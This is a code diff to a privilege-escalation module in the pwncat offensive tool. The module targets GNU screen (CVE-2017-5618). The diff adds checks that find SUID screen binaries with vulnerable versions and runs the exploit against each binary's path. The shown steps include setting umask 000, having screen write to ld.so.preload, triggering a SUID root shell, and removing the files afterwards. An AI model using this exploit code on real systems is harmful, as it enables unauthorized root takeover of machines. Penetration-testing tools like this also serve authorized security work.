@@ -14,48 +14,62 @@ from pwncat.util import CompilationError
 class Method(BaseMethod):
 
     name = "screen (CVE-2017-5618)"
-    BINARIES = ["screen"]
-
-    def __init__(self):
-        self.ran_before = False
+    BINARIES = []
 
     def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
         """ Find all techniques known at this time """
 
         # If we have ran this before, don't bother running it
-        if self.ran_before or not (Capability.SHELL & capability):
+        if Capability.SHELL not in capability:
             return []
 
-        # Carve out the version of screen
-        version_output = pwncat.victim.run("screen -v").decode("utf-8").strip()
-        match = re.search(r"(\d+\.\d+\.\d+)", version_output)
-        if not match:
-            raise PrivescError("could not gather screen version")
+        # Grab all possibly vulnerable screen version
+        # It has to be SUID for this to work.
+        facts = [
+            f
+            for f in pwncat.victim.enumerate("screen-version")
+            if f.data.vulnerable and f.data.perms & 0o4000
+        ]
 
-        # Knowing the version of screen, check if it is vulnerable...
-        version_triplet = [int(x) for x in match.group().split(".")]
+        # Make a list of techniques to return
+        techniques: List[Technique] = []
 
-        if version_triplet[0] > 4:
-            raise PrivescError("screen seemingly not vulnerable")
+        for fact in facts:
 
-        if version_triplet[0] == 4 and version_triplet[1] > 5:
-            raise PrivescError("screen seemingly not vulnerable")
+            # Carve out the version of screen
+            version_output = (
+                pwncat.victim.run(f"{fact.data.path} -v").decode("utf-8").strip()
+            )
+            match = re.search(r"(\d+\.\d+\.\d+)", version_output)
+            if not match:
+                continue
 
-        if (
-            version_triplet[0] == 4
-            and version_triplet[1] == 5
-            and version_triplet[2] >= 1
-        ):
-            raise PrivescError("screen seemingly not vulnerable")
+            # We know the version of screen, check if it is vulnerable...
+            version_triplet = [int(x) for x in match.group().split(".")]
 
-        # If screen is vulnerable, try the technique!
-        techniques = [Technique("root", self, None, Capability.SHELL)]
+            if version_triplet[0] > 4:
+                continue
+
+            if version_triplet[0] == 4 and version_triplet[1] > 5:
+                continue
+
+            if (
+                version_triplet[0] == 4
+                and version_triplet[1] == 5
+                and version_triplet[2] >= 1
+            ):
+                continue
+
+            # This may work!
+            techniques.append(Technique("root", self, fact, Capability.SHELL))
+
         return techniques
 
     def execute(self, technique: Technique):
         """ Run the specified technique """
 
-        self.ran_before = True
+        # Grab the path from the fact (see self.enumerate)
+        screen = technique.ident.data.path
 
         # Write the rootshell source code
         rootshell_source = textwrap.dedent(
@@ -114,10 +128,10 @@ class Method(BaseMethod):
         pwncat.victim.run("umask 000")
 
         # Run screen, loading our library and causing our rootshell to be SUID
-        pwncat.victim.run(f'screen -D -m -L ld.so.preload echo -ne "{libhack_so}"')
+        pwncat.victim.run(f'{screen} -D -m -L ld.so.preload echo -ne "{libhack_so}"')
 
         # Trigger the exploit
-        pwncat.victim.run("screen -ls")
+        pwncat.victim.run(f"{screen} -ls")
 
         # We no longer need the shared object
         pwncat.victim.env(["rm", "-f", libhack_so])
@@ -133,7 +147,7 @@ class Method(BaseMethod):
             pwncat.victim.env(["cd", old_cwd])
 
             # Ensure the files are removed
-            pwncat.victim.env(["rm", "-f", libhack_so, rootshell])
+            pwncat.victim.env(["rm", "-f", rootshell])
 
             raise PrivescError("failed to create root shell")
 
